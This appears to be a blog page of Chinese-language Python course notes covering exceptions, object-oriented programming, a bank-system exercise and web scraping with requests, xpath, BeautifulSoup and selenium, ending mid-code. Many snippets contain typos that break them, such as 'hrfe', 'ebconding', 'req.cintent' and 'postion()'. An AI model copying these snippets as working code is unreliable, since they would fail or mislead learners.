<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 异常机制num = 0try:    num = int(input(&quot;请输入一个数字:&quot;))except ValueError as ve:    print(&quot;输入的格式不正确&quot;,ve)else:    print(&quot;else&quot;)</span></span><br></pre></td></tr></table></figure>

<p>如果不知道具体的异常类型，我们可以使用异常的祖宗（Exception）</p>
<p>在try中存在多个异常 出现第一个异常 将其捕获 try-except就结束了 不会去捕获其他异常</p>
<p>捕获异常只是辅助程序员修改程序中出现的问题</p>
<p>finally:  无论try中是否有异常 都会执行</p>
<h3 id="手动抛出异常"><a href="#手动抛出异常" class="headerlink" title="手动抛出异常"></a>手动抛出异常</h3><p>语句:raise 异常对象</p>
<p>抛出异常的语句是跟随在一条语句的后面的</p>
<p>只要在语句后面写上 手动抛出异常的语句 无论这句语句有没有异常 程序都会将异常抛出</p>
<p>raise后面不能直接跟随其他语句 因为这些代码无法执行</p>
<p>手动抛出异常的处理</p>
<p>1.可以当场把出现异常的代码使用try-except包含</p>
<p>2.如果不想执行第一种行为：函数体内有异常 只要调用函数机会出现异常  谁调用函数 谁去处理</p>
<h3 id="自定义异常–-涉及到面向对象的知识点"><a href="#自定义异常–-涉及到面向对象的知识点" class="headerlink" title="自定义异常– 涉及到面向对象的知识点"></a>自定义异常– 涉及到面向对象的知识点</h3><p>练习：</p>
<p>1.删除指定目录</p>
<p>2.在a文件中读取数据，写入到b文件中，如果b文件中有内容，拼接在原有内容的后面</p>
<p>注：内容自定义</p>
<p>预习：面向对象思想</p>
<h1 id="面向对象思想"><a href="#面向对象思想" class="headerlink" title="面向对象思想"></a>面向对象思想</h1><p>面向对象编程</p>
<p>OOP（Object Oriented Programming ）是程序的一种设计思想。</p>
<p>OOP把对象当做程序的基本单元，一个对象包含了数据和操作数据的功能</p>
<h2 id="常见的编程思想："><a href="#常见的编程思想：" class="headerlink" title="常见的编程思想："></a>常见的编程思想：</h2><h3 id="面向过程程序"><a href="#面向过程程序" class="headerlink" title="面向过程程序"></a>面向过程程序</h3><p>把程序视为一系列命令的集合 也就是一组函数的顺序执行</p>
<p>为了简化程序 把函数分为多个子函数 通过子函数的调用来完成程序的执行 降低程序的复杂度</p>
<h3 id="面向对象程序"><a href="#面向对象程序" class="headerlink" title="面向对象程序"></a>面向对象程序</h3><p>把程序做一组对象的集合 每个对象都可以调用其他对象发送过来的消息 并处理这些消息 其实就是一些消息在各个对象直接进行传递</p>
<p>例：在Python中 是面向对象的编程语言 所有的数据类型都可以视为对象</p>
<p>a = 10</p>
<p>例子：</p>
<p>想处理学生的成绩表  查询学生的成绩</p>
<p>student1 = {“name”:”开群”,”socre“:88}</p>
<p>student2 = {“name”:”小东”,”socre“:85}</p>
<p>具有相同特征的 – 归为一类事物</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>:</span>	<span class="comment"># 描述所有个体的特征	name = &quot;&quot;	score = 0</span></span><br></pre></td></tr></table></figure>

<h2 id="面向对象和面向过程的区别"><a href="#面向对象和面向过程的区别" class="headerlink" title="面向对象和面向过程的区别"></a>面向对象和面向过程的区别</h2><h3 id="面向过程："><a href="#面向过程：" class="headerlink" title="面向过程："></a>面向过程：</h3><p>在生活中出现面向过程：</p>
<p>一种看待问题的方式 在思考问题的时候着眼于问题是怎样一步一步解决的  亲力亲为的去解决问题</p>
<p>买电脑：查看电脑的资料 — 去电脑城买电脑 — 砍价</p>
<p>在程序中：</p>
<p>代码是从上向下执行的</p>
<p>各模块之间的关系尽量的简单 几乎各自独立状态 每一个模块的内部都是顺序 选择 循环结构来完成的</p>
<p>通过函数设置 在自己模块中一步一步调用完成功能的需求 </p>
<h3 id="面向对象：【更符合生活】"><a href="#面向对象：【更符合生活】" class="headerlink" title="面向对象：【更符合生活】"></a>面向对象：【更符合生活】</h3><p>在生活中：着眼于指定的功能的具体的个体 委托这个个体完成指定的功能 这个具体的个体就是对象</p>
<p>买电脑：委托身边对电脑特别熟悉的人 去帮自己买电脑</p>
<p>在程序中：</p>
<p>把数据和操作的方法放在一起 作为一个相互依存的整体  — 对象</p>
<p>对同类的整体（对象）进行抽象提取 形参类</p>
<p>类里面存在的是相同对象的共同特性和行为</p>
<p>类通过一个简单的外部方法与外界发生关系，创建对象 达到对象和对象直接交互的关系</p>
<h3 id="项目流程："><a href="#项目流程：" class="headerlink" title="项目流程："></a>项目流程：</h3><p>产品经理： 根据项目需求 指定项目功能 画出大致的功能流程图—- 原型图</p>
<p>开发人员–测试人员–UI设计人员  一起研究</p>
<p>后台开发人员： 设计数据库 设计接口    UI人员： 设计图 —–&gt;开发人员 会比照原型图 和 设计图做对比  不合理 打回去重做</p>
<p>前段开发人员： 根据UI设计图 进行界面设计</p>
<p>前段开发人员与后台开发人员 对照接口调试数据 测试/调试接口【本地接口】</p>
<p>后台接口上线 – 在与前段人员进行调试【正式接口也调用完了】</p>
<p>测试人员 ：根据功能/设计图  去看项目中的问题 – 提交问题 –改bug</p>
<p>程序正式上线</p>
<h3 id="面向对象和面向过程区别的总结"><a href="#面向对象和面向过程区别的总结" class="headerlink" title="面向对象和面向过程区别的总结"></a>面向对象和面向过程区别的总结</h3><p>这两个都是看待问题的一种思维方式 都能够解决问题</p>
<p>面向过程着眼于问题是一步一步解决的</p>
<p>面向对象着眼于对象：找到具体功能的对象 委托其完成指定功能</p>
<h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><p>在面向对象的语言中 类和对象是面向对象的核心</p>
<h3 id="类的概念："><a href="#类的概念：" class="headerlink" title="类的概念："></a>类的概念：</h3><p>一个具有特殊功能的实体的集合 类是Python语言的基本单位</p>
<p>对象的概念：</p>
<p>在一类事物中 具有特殊功能的实体 可以被委托完成任务 称之为对象 / 实例</p>
<p>两者之间的关系：</p>
<p>类是对象的抽象描述   对象是类的实例【对象是真实存在的具体一个事物】</p>
<p>例子：</p>
<p>类    对象</p>
<p>学生类     开群   小东</p>
<p>电脑  我正在使用的Windows</p>
<p> a =  “10“</p>
<h3 id="自定义类的格式"><a href="#自定义类的格式" class="headerlink" title="自定义类的格式"></a>自定义类的格式</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">声明一个类的关键字  <span class="class"><span class="keyword">class</span>对象的描述：	特征描述：名字			年龄	行为描述：			正在吃饭...			正在跑步...	这些描述映射到程序中：			特征描述  --- 变量（属性）			行为描述  --- 功能（方法）<span class="title">class</span> 自定义类的名字：	 <span class="title">def</span> <span class="title">__init__</span>(<span class="params">self,形参列表</span>)：	 	<span class="title">self</span>.特征描述的变量 = 创建对象传值的初始化数据	 <span class="title">def</span> 行为名字(<span class="params">self,参与行为的未知项</span>):</span>	 	行为的实现</span><br></pre></td></tr></table></figure>

<p>案例：</p>
<p>学生类 :</p>
<p>特征描述：姓名 年龄  性别</p>
<p>行为描述：</p>
<p>正在吃饭…</p>
<p>正在跑步…</p>
<h3 id="创建对象格式"><a href="#创建对象格式" class="headerlink" title="创建对象格式"></a>创建对象格式</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">变量 = 自定义的类名称(描述该对象的数据值)</span><br></pre></td></tr></table></figure>

<p>练习：</p>
<p>动物类</p>
<p>特性：品种  性别  年龄</p>
<p>行为：吃饭 睡觉</p>
<p>创建对象：</p>
<p>东北虎  雄  2</p>
<p>调用吃饭行为：东北虎在吃饭</p>
<p>长毛兔  雌  1</p>
<p>调用睡觉行为：长毛兔在睡觉</p>
<h2 id="对象和类的回顾"><a href="#对象和类的回顾" class="headerlink" title="对象和类的回顾"></a>对象和类的回顾</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>:</span>    <span class="string">&quot;&quot;&quot;    def __init__(self,name,age,sex,address):    初始化方法：来为新建的对象进行初始化特征值的    self  --- 表示你当前创建的对象         初始化方法需要明确为那个对象来进行初始化 -- 用self来接受的对象         这个self不需要手动进行赋值的 自动将你创建的对象赋予给self    动态为对象添加字段（属性） ：对象有哪些特征 直接通过self.特征名字 动态添加    注：self.name 和 init方法中的形参名name不是一个内容    self.name --- 表示是该对象的特征    形参name --- 接受初始化数据 为特征赋值的    &quot;&quot;&quot;</span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name,age,sex,address</span>):</span>        self.name = name        self.age = age        self.sex = sex        self.address =address        <span class="built_in">print</span>(<span class="string">&quot;嘿嘿&quot;</span>)    <span class="comment"># 行为    def sleep(self):        print(self.name,&quot;在睡觉&quot;)    # 析构方法    def __del__(self):        print(self.name,&quot;在内存中消失了..&quot;)</span></span><br></pre></td></tr></table></figure>

<h2 id="面向对象语言的三大特性：封装-继承-多态"><a href="#面向对象语言的三大特性：封装-继承-多态" class="headerlink" title="面向对象语言的三大特性：封装  继承  多态"></a>面向对象语言的三大特性：封装  继承  多态</h2><h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>什么是封装？</p>
<p>在程序中 封装就是对具体对象的一种抽象  </p>
<p>简单的说：将某些部分隐藏起来  程序的其他位置是看不到的【没有办法直接调用】</p>
<p>隐藏起来 — 私有化</p>
<p>将类中的特征或者某些方法私有化  外部无法直接使用</p>
<p>封装的好处：</p>
<p>1.保护隐私   – 把不想让外界知道的部分隐藏起来</p>
<p>2.隔离复杂度 – 把程序中复杂的实现 隐藏起来  – 对外部提供一个简单的接口</p>
<p>3.提高代码的健壮性</p>
<p>代码中的封装如何实现：</p>
<p>一般就是将属性私有化 对属性提供对应的set和get方法</p>
<p>练习封装：昨天动物类</p>
<h3 id="属性化get和set方法"><a href="#属性化get和set方法" class="headerlink" title="属性化get和set方法"></a>属性化get和set方法</h3><p>方法的调用 </p>
<p>对象名.方法名()</p>
<p>将其属性化之后 — 调用的时候与直接调用属性的格式类似</p>
<p>直接调用属性  对象名.属性名</p>
<p>将方法属性化之后  对象名.方法名</p>
<p>将get方法属性化方式 - 系统提供一个装饰器  @property</p>
<p>将set方法属性化方法 – 在get方法属性化的基础创建一个setter装饰器  – 将set方法属性化  格式：@get方法名.setter</p>
<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>在程序中：</p>
<p>有两个或者多个相关的类中提取共性 将共性存放于一个共通类中 通过指定方式有普通类与共通类关联起来 形成继承体系</p>
<p>共通类： 称为父类、超类、基类</p>
<p>普通类：子类</p>
<p>父类和子类的关系：子类继承自父类    父类派生出子类</p>
<p>案例：</p>
<p>学生类：</p>
<p>特征：学号 [姓名 年龄  性别]</p>
<p>行为：学习 [吃饭]</p>
<p>工人类：</p>
<p>特征：工号 [姓名 年龄  性别]]</p>
<p>行为：工作 [吃饭]</p>
<p>人类：</p>
<p>特征：姓名 年龄  性别</p>
<p>行为：吃饭</p>
<p>格式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">父类的格式：	<span class="class"><span class="keyword">class</span> 父类的类名:</span>		<span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,形参列表</span>)			子类共同的特征(<span class="params">属性</span>)		子类中共同行为子类	<span class="title">class</span> 子类类名(<span class="params">父类类名</span>):</span>		<span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,共性属性列表,个性属性的列表</span>)			# 调用父类的共性属性进行初始化			# 在为个性属性进行赋值		个性方式</span></span><br></pre></td></tr></table></figure>

<h4 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h4><p>Dog:</p>
<p>特征：昵称    年龄     品种     性别</p>
<p>行为：啃骨头    看家</p>
<p>Cat:</p>
<p>特征：昵称    年龄    性别</p>
<p>行为：吃鱼    抓老鼠</p>
<p>抽象父类，完成继承关系，进行测试</p>
<p>要求：对属性进行封装</p>
<h3 id="继承中的概念"><a href="#继承中的概念" class="headerlink" title="继承中的概念"></a>继承中的概念</h3><p>单继承：一个类仅有一个父类</p>
<p>多重继承/多层继承：一个类可以间接继承多个父类 </p>
<p>子类–父类–爷爷类–祖宗类</p>
<p>虽然是间接继承 也可以直接使用共性的</p>
<p>多继承：一个类可以有多个父类【Python是支持多继承】</p>
<p>class 子类(父类1，父类2，…父类n)</p>
<p>案例：动物体系演示概念</p>
<p>狗：dog</p>
<p>蝙蝠：bat</p>
<p>鹦鹉：parrot</p>
<p>鸵鸟：ostrich</p>
<p>顶级类：动物   Animal</p>
<p>哺乳类Mammal和鸟类Brid </p>
<p>哺乳类：狗  蝙蝠</p>
<p>鸟类：鹦鹉 鸵鸟</p>
<p>能跑的runnable  能飞的flyable</p>
<h3 id="方法的重写"><a href="#方法的重写" class="headerlink" title="方法的重写"></a>方法的重写</h3><p>子类去重写父类中的方法</p>
<p>什么时候进行重写？</p>
<p>子类中的功能的实现 父类无法满足了 子类就可以对其进行重写</p>
<p>当子类重写了父类中的方法 子类在调用该方法是 调用的是子类重写的方法</p>
<h3 id="系统方法的重写"><a href="#系统方法的重写" class="headerlink" title="系统方法的重写"></a>系统方法的重写</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__str__  应用于用户的 用户查看的信息 使用__str__显示出来__repr__ 类似__str__ 正对程序而言__slots__ 对象的特征是动态赋予</span><br></pre></td></tr></table></figure>



<h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>多态：事物的多种形态</p>
<p>静态语言  和 动态语言</p>
<p>静态语言 类型是明确的  Java </p>
<p>声明一个变量的时候 必须先指明该变量被赋值的类型 这个变量被赋值只能定义该类型的值  例如：int num = 0</p>
<p>如果赋予其他的值 就会报错</p>
<p>整数:byte short int long</p>
<p>浮点数：float double</p>
<p>….</p>
<p>动态语言：Python</p>
<p>变量的类型是根据赋值来决定</p>
<p>a = 10   a=”10”</p>
<p>主人  介绍宠物</p>
<p>宠物猫</p>
<p>宠物狗</p>
<h2 id="类属性和类方法"><a href="#类属性和类方法" class="headerlink" title="类属性和类方法"></a>类属性和类方法</h2><p>对象属性：在类中描述的对象特征  —- 对象属性</p>
<p>想获取/修改对象属性的值   只能借助对象去修改</p>
<p>stu = Student(“小东”,18)</p>
<p>name age</p>
<p>stu.name</p>
<p>每个对象都有类中描述的属性 但是又可能每个对象对应的特征值是不一样</p>
<p>类属性：</p>
<p>是属于类的  该类所有对象都是共享</p>
<p>无论该类那个对象来进行调用 值都是一样的</p>
<p>直接类中包含的变量 – 类属性</p>
<p>什么时候去使用类属性？</p>
<p>如果该类所有对象对应的某个属性（字段）的值都是一样的 就可以将这个字段提升为类属性</p>
<p>注;在使用类属性是 建议是通过类名来进行调用 也可以通过对象来调用</p>
<p>类方法需要对象类属性进行操作 将方法设置为类方法</p>
<p>将一个方法设置类方法的方法：需要在方法添加装饰器@classmethod </p>
<p>类方法第一个参数cls–用于接收类型</p>
<p>案例：参考代码</p>
<h2 id="深拷贝和浅拷贝"><a href="#深拷贝和浅拷贝" class="headerlink" title="深拷贝和浅拷贝"></a>深拷贝和浅拷贝</h2><p>浅拷贝：</p>
<p>只是拷贝了最外层对象本身 对象内部的其他对象只能拷贝地址引用</p>
<p>深拷贝：</p>
<p>外部和内部的对象都进行拷贝</p>
<p>引用拷贝：</p>
<p>声明一个对象的时候 声明一个变量来接受对象 这个变量只是对象的地址</p>
<h2 id="项目案例：银行管理系统（面向对象）"><a href="#项目案例：银行管理系统（面向对象）" class="headerlink" title="项目案例：银行管理系统（面向对象）"></a>项目案例：银行管理系统（面向对象）</h2><p>功能：1.开户    2. 查询    3.存款    4.取款    5.转账    6.该密    7.锁卡    8.解卡    9.销户    0.退出</p>
<p>需求: 根据上面的功能，进行模拟</p>
<p>创建的类：</p>
<p>账号类：姓名  身份证    所拥有的卡【一个账号对象一张卡】</p>
<p>卡类：卡号    密码    金额【默认10】 是否锁卡【默认没锁】</p>
<p>操作类：功能体现</p>
<p>测试类：导入操作类  进行测试</p>
<h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><h2 id="requests-获取网页对象模块"><a href="#requests-获取网页对象模块" class="headerlink" title="requests 获取网页对象模块"></a>requests 获取网页对象模块</h2><p>​    西次代理 {‘https’:代理地址：9999’}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">req ==requests.get(访问地址,headers=&#123;请求头&#125;，proxies=&#123;传入代理地址&#125;，timeout=时间，auth=HTTPBasicAuth(&#x27;账户&#x27;, &#x27;密码&#x27;)，potion=potion,) req.text:输出返回的值，文本 req.content: 输出返回值，返回一个二进制值req.status_code:打印状态码 200为正常访问req.url: 返回请求路径requests.get(‘https://github.com/timeline.json’) #GET请求requests.post(“http://httpbin.org/post” ,data=表单参数,params=查询参数 ，headers=请求头) #POST请求，上传/添加数据requests.put(“http://httpbin.org/put”) #PUT请求，修改或更改数据 requests.delete(“http://httpbin.org/delete”) #DELETE请求删除数据requests.head(“http://httpbin.org/get”) #HEAD请求requests.options(“http://httpbin.org/get”) #OPTIONS请求chardet 转换编码模块req.encoding = chardet.detect(req.content)[&quot;ebconding&quot;](第一种方式)req.encoding = &quot;utf-8&quot;|&quot;gbk&quot;:转换编码(第二种方式)#案列import requests r = requests.get(url=&#x27;http://www.itwhy.org&#x27;)    # 最基本的GET请求print(r.status_code)    # 获取返回状态r = requests.get(url=&#x27;http://dict.baidu.com/s&#x27;, params=&#123;&#x27;wd&#x27;:&#x27;python&#x27;&#125;)   #带参数的GET请求print(r.url) #返回请求网址print(r.text)   #打印解码后的返回数据模块chardet 编码转换ss = chardet.detect(req.cintent)[encoding] #获取编码</span><br></pre></td></tr></table></figure>

<h2 id="warnings-模块-去除警告"><a href="#warnings-模块-去除警告" class="headerlink" title="warnings  模块 去除警告"></a>warnings  模块 去除警告</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">warnings.filterwarnings(&quot;ignore&quot;)</span><br></pre></td></tr></table></figure>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="xpath-网页解析"><a href="#xpath-网页解析" class="headerlink" title="xpath 网页解析"></a>xpath 网页解析</h2><p>提取所有标签下的元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//div</span><br></pre></td></tr></table></figure>

<p>当前节点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/a</span><br></pre></td></tr></table></figure>

<h4 id="提取文本"><a href="#提取文本" class="headerlink" title=".提取文本"></a>.提取文本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a/text()</span><br></pre></td></tr></table></figure>

<p>提取属性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a/@href</span><br></pre></td></tr></table></figure>

<p>提取指定位置的元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;//div[1]/a/@hrfe&#x27;</span> <span class="comment">#获取第一个div标签下是a标签hrfe属性</span></span><br></pre></td></tr></table></figure>

<p>获取最后一个div标签下是a标签属性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;//div[last()]/a/@hrfe&#x27;</span> </span><br></pre></td></tr></table></figure>

<p>获取倒数第二个div标签下是a标签属性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;//div[last()-2]/a/@hrfe&#x27;</span> </span><br></pre></td></tr></table></figure>

<p>获取前n个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//div[postion()&lt;n]</span><br></pre></td></tr></table></figure>

<p>通过属性查找</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;//div[@class=&quot;shu&quot;]/a/@hrfe&#x27;</span> <span class="string">&#x27;//div[@id=&quot;shu&quot;]/a/@hrfe&#x27;</span> </span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">xpath模块 解析网页<span class="comment">#模块导入from lxml import etree#首先要初始化网页后才能通过xpath#初始化html = etree.HTML（(req.text) 或 (req.content)传入请求对象）html.xpath(传入选取的节点)/	从根节点选取。//	从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置。.	选取当前节点。..	选取当前节点的父节点。@	选取属性。|   或者元素child::book	选取所有属于当前节点的子元素的 book 节点。attribute::lang	选取当前节点的 lang 属性。child::*	选取当前节点的所有子元素。attribute::*	选取当前节点的所有属性。child::text()	选取当前节点的所有文本子节点。child::node()	选取当前节点的所有子节点。descendant::book	选取当前节点的所有 book 后代。ancestor::book	选择当前节点的所有 book 先辈。ancestor-or-self::book	选取当前节点的所有 book 先辈以及当前节点（如果此节点是 book 节点）child::*/child::price	选取当前节点的所有 price 孙节点案列html.xpath(r&#x27;//[@id=&quot;id选择器名字&quot;]/div/tr/a@herf&#x27;)#返回的是a标签里的路径 返回是列表案列2html.xpath(r&#x27;//[@id=&quot;id选择器名字&quot;]/div/tr/a/text()&#x27;)#返回的是a标签里的文本 返回是列表html.xpath(r&#x27;//[@id=&quot;id选择器名字&quot;]/div/tr/a/text() | //[@id=&quot;id选择器名字&quot;]/div/tr/a/text()&#x27;) 可以这种表示法</span></span><br></pre></td></tr></table></figure>

<h2 id="bs4模块"><a href="#bs4模块" class="headerlink" title="bs4模块"></a>bs4模块</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="comment">#包import requests req = requests.get()req.encoding =&quot;utf-8&quot;# 生成BeautifulSoup对象soup = BeautifulSoup(&#x27;req.text 或 text.content &#x27;,&#x27;lxml(固定模式)&#x27;)print(soup.prettify())  # 输出格式化print(&quot;hade标签内容&quot;,soup.head) # 获取hade标签print(soup.body.a.img)  # 获取到body的第一个a标签print(&quot;获取所有的img标签&quot;,soup.find_all(&#x27;img&#x27;)) # 获取所有的img标签 find_all()print(&quot;获取的第一个img的属性&quot;,url + soup.img[&#x27;src&#x27;]) # 获取src的属性print(&quot;a标签name&quot;,soup.a.name) # 获取a标签名name   a元素# 修改a标签为b标签tag = soup.a# 修改btag.name = &#x27;b&#x27; # 赋值print(&quot;a标签修改后的tag内容&quot;,tag)# 获取全部属性print(&quot;tag对象的全部属性&quot;,tag.attrs)# 获取属性的值  classprint(&quot;class的值&quot;,tag[&#x27;class&#x27;])# 修改class的值tag[&#x27;class&#x27;] = &quot;Logo&quot;# 输出修改后的内容print(tag.attrs)# 新增属性  idtag[&#x27;id&#x27;] = &quot;logo&quot;print(tag.attrs)# 输出标签print(&quot;tag标签&quot;,tag)# 删除属性del tag[&#x27;href&#x27;]print(&quot;tag标签&quot;,tag)# 针对内容操作# 获取title的内容tag = soup.titleprint(tag)# 获取标签中的字符串print(&quot;tag标签中的字符串&quot;,tag.string)# 替换标题内容tag.string.replace_with(&quot;重庆华信智原&quot;)print(tag)# 获取注释的内容# &lt;!-- 学科建设 --&gt;markup = &quot;&lt;b&gt;&lt;!-- 学科建设 --&gt;&lt;/c&gt;&quot; # &lt;b&gt;&lt;/c&gt;没有任何意义soup_comment = BeautifulSoup(markup,&#x27;lxml&#x27;)# 获取文本comment = soup_comment.b.stringprint(comment)# 获取某个元素的全部节点  titleprint(&quot;名为title的全部节点&quot;,soup.find_all(&#x27;title&#x27;))# 获取title的文本数据  string get_text()print(soup.title.string) (一)print(soup.title.get_text()) （二）# 查找ul元素标签 参数  属性  class  idtag = soup.find_all(&#x27;ul&#x27;,class_=&#x27;menu&#x27;) # 按照css类名进行完全匹配print(&quot;匹配ulclass名menu节点&quot;,tag)# 通过id匹配tag = soup.find_all(id=&#x27;menu&#x27;)print(&quot;通过id匹配节点&quot;,tag)# 通过ul名称下a标签的内容taga = soup.ul.find_all(&#x27;a&#x27;)print(&quot;ul下所有的a标签&quot;,taga)# 输出a标签的所有hreffor tag in  taga:    print(tag.get(&#x27;href&#x27;))# 获取整个页面的url地址 进行下载在本地tagimgs = soup.find_all(&#x27;img&#x27;)print(tagimgs)# 循环输出图片的地址for imgsrc in tagimgs:    print(url + imgsrc.get(&#x27;src&#x27;))      #ul的class属性pli 下的li 的标签  tu = soup.select(&#x27;&#x27;ul.pli &gt; li &gt; div &gt; a &gt; img&#x27;&#x27;) #返回为一个可迭代的#获取img里的所有src路径sq = [i[&quot;src&quot;] for i in tu] #列表生成式</span></span><br></pre></td></tr></table></figure>







<h2 id="selenium-动态网页爬取"><a href="#selenium-动态网页爬取" class="headerlink" title="selenium 动态网页爬取"></a>selenium 动态网页爬取</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">官方文档:https://selenium-python.readthedocs.io/api.html<span class="comment">#module-selenium.webdriver.common.action_chainschromedriver下载：http://chromedriver.storage.googleapis.com/index.htmlchromedriver与chrome的对应关系表：https://www.jb51.net/article/151629.htm    基本使用#安装: pip install selenium#导入模块from selenium import webdriverfrom selenium.webdriver.common.action_chains import ActionChains  # 鼠标操作模块#创建浏览器对象browser = webdriver.Chrome(executable_path=&#x27;chromedriver.exe&#x27;可不用填写)   # 声明一个浏览器对象   指定使用chromedriver.exe路径browser.get(&quot;https://www.baidu.com&quot;)  # 打开Chrome并导入路径input = browser.find_element_by_id(&quot;kw&quot;)  # 通过id定位到input框input.send_keys(&quot;python&quot;)   # 在输入框内输入pythonbrowser.implicitly_wait(2) # 设定等待时间browser.save_screenshot(&#x27;传入保存的名字&#x27;)#对当前页面进行截屏#得到需要鼠标移动位置的节点weizhi = find_elements_by_name(&quot;q&quot;)#把鼠标移上去#perform()立即执行鼠标事件ActionChains(&#x27;浏览器对象&#x27;).move_to_element(wenzhi).perform()#鼠标点击事件#鼠标点击长按指定的标签ActionChains(&#x27;浏览器对象&#x27;).click_and_hold(&#x27;q 定位节点 &#x27;)for i in range(5)：	#这一步显示为鼠标长按一个节点，并水平方向移动12个像素	ActionChains(&#x27;浏览器对象&#x27;).move_to_element(12，x轴，y轴).perform()#释放动作ActionChains(&#x27;浏览器对象&#x27;).release() browser.maximize_window() #窗口最大化     browser.minimize_window() #窗口最小化browser.execute_script(&quot;window.scrollTo(0,document.body.scrollHeight)&quot;) # 将进度条下拉到最底部（第一种）browser.execute_script(scroll(0,屏幕的高度))#（第二种）find_elements_by_id(&quot;q&quot;).get_attribute(&quot;src&quot;)  #获取标签里的src 属性#处理弹框页面，accept()确定  dismiss()取消browser.swith_to_alert().accept()#返回上一级页面browser.back()#返回下一级页面browser.forward()find_elements_by_id(&quot;q&quot;.text #获取文本send_keys()  #输入文字用clear()  #清空文字用click()  #点击按钮用browser.current_url  # 打印url路径browser.get_cookies()  # 打印Cookiesbrowser.page_source    # 打印整个网页源代码browser.close()        # 关闭浏览器                      #无头浏览器,也可称为不可视化  #导入模块 from selenium.webdriver.chrome.options import Options #实力化options = Options()options.add_argument(&#x27;--headless&#x27;)options.add_argument(&#x27;--disable-gpu&#x27;) #实力化浏览器时传入一个参数  webdriver.Chrome(url,chrome_options=options)                                            #不显示检测弹框#导入模块from selenium.webdriver import ChromeOptionsoption = ChromeOptions()   option.add_experimental_option(&#x27;excludeSwitches&#x27;,[&#x27;enable-automation&#x27;])  #实力化浏览器时传入一个参数                     webdriver.Chrome(options=option)                                         #嵌套iframe#如果定位的标签是存在于iframe标签中，则必须通过如下方法进行定位：div=  broeser.switch_to.frame(&#x27;定位于iframe节点&#x27;)div.find——element_by_....(&#x27;需要定位的节点&#x27;)#获取单节点# 通过属性查找单个节点，当在element后面增添一个“s”时就是查找多个browser.find_elements_by_css_selector(&quot;.service-bd li&quot;)  # 注意是elements多个s，输出为列表find_elements_by_id(&quot;q&quot;)find_elements_by_name(&quot;q&quot;)find_elements_by_css_selector(&quot;#q&quot;)find_elements_by_xpath(&#x27;//*[@id=&quot;q&quot;]&#x27;)find_elements_by_link_textfind_elements_by_partial_link_textfind_elements_by_tag_namefind_elements_by_class_name browser.find_element_by_id(&quot;id的名字&quot;)  # 通过id找     browser.find_element_by_name(&quot;name的名字&quot;)  # 通过name属性值找 web.find_element_by_class_name() #通过class查找     browser.find_element_by_css_selector(&quot; .classmingzi &gt; 下一级 &gt; ....&quot;) # 根据css选择器找#s_position_list &gt; ul &gt; li.con_list_item.first_row.default_list &gt; div.list_item_top &gt; div.position &gt; div.p_top &gt; a     # 根据css选择器找 注意 &gt; 两端要有一个空格  browser.find_element_by_xpath(&#x27;//*[@id=&quot;q&quot;]&#x27;) # 根据xpath找#//*[@id=&quot;s_position_list&quot;]/ul/li[1]/div[1]/div[1]/div[1]/a 根据xpath找#关闭浏览器 browser.close()# 其他获取单个节点方法find_element_by_link_textfind_element_by_partial_link_textfind_element_by_tag_namefind_element_by_class_name#案列获取输入框并输入关键字，点击搜索按钮import timefrom selenium import webdriverbrowser = webdriver.Chrome()browser.get(&quot;https://www.taobao.com&quot;)input = browser.find_element_by_id(&quot;q&quot;)input.send_keys(&quot;iPhone&quot;)   #在搜索框输入iPhoneinput.clear()  # 清空搜索框的文字time.sleep(2)input.send_keys(&quot;iPad&quot;)  # 在搜索框输入iPadbutton = browser.find_element_by_class_name(&quot;btn-search&quot;)  # 获取点击按钮button.click()  # 点击搜索#当需要进入二级页面时，所用方法#获取当前所有句柄（窗口） url = browser.window_handles #这回把所有路径都存在一个列表里，而且是  一级网页存放在前面，二级页面放在后面                #切换到二级网页里面，切换到新的页面  browser.switch_to_window(url[1])                   #案列from selenium import webdriverfrom selenium.webdriver import ActionChains   # 引入动作链browser = webdriver.Chrome()url = &quot;https://www.runoob.com/try/try.php?filename=jqueryui-api-droppable&quot;browser.get(url)browser.switch_to.frame(&quot;iframeResult&quot;)  # 切换到元素所在的frame[框架]&quot;&quot;&quot;可以传入id、name、index以及selenium的WebElement对象,index从0开始&quot;&quot;&quot;source = browser.find_element_by_css_selector(&quot;#draggable&quot;) # 找到被拖拽对象target = browser.find_element_by_css_selector(&quot;#droppable&quot;) # 找到目标actions = 